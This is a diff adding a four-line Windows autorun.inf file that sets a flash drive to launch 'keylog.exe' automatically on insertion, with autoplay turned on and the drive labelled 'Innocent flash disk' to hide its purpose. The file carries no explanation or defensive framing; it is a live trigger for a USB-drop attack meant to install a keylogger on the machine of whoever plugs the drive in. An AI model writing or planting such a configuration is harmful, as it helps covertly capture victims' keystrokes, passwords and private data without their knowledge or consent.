@@ -1,0 +1,4 @@
+[autorun]
+Open=keylog.exe
+UseAutoPlay=1
+Label=Innocent flash disk
